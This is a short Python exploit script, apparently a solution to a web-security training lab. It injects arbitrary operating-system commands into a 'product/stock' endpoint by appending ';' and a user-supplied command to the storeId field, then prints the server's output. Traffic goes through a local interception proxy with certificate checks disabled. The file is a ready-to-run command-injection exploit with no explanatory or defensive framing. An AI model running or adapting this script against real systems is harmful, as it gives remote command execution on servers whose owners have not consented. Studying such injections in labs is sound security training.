import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def run_command(url, c):
    stock_path = 'product/stock'
    data = {'productId': '1', 'storeId': f'1;{c}'}
    r = requests.post(url + stock_path, data=data, verify=False, proxies=proxies)
    print("Output: \n" + r.text)

def main():
    if len(sys.argv) != 3:
        print("(+) Usage: %s <url> <command>" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    c = sys.argv[2]
    run_command(url, c)

if __name__ == "__main__":
    main()
